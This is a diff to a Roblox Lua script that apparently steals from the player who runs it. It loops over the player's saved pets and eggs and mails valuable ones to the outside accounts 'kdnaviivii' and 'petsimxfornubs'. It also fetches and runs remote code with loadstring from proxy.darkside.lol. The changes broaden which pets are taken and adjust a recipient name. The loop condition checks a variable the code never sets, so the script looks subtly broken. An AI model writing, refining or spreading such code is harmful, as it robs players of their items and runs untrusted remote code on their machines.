@@ -100,7 +100,7 @@ return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild
 end
 
 for i,v in pairs(save.Inventory.Pet) do
-if string.find(v.id, "Jelly") and ndir[v.id].difficulty > 24999999 then
+if string.find(v.id, "Jel") and ndir[v.id].difficulty > 24999999 then
 local _x,_e=false,""
 repeat
 _x,_e = _mail("kdnaviivii", "Pet", i, (v._am or 1))
@@ -113,7 +113,7 @@ for i,v in pairs(save.Inventory.Egg) do
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()((v._am or 1).."x "..v.id)
 local _x,_e=false,""
 repeat
-_x,_e = _mail("PetSimxForNubs", "Egg", i, (v._am or 1))
+_x,_e = _mail("petsimxfornubs", "Egg", i, (v._am or 1))
 wait()
 until _X==true
 end
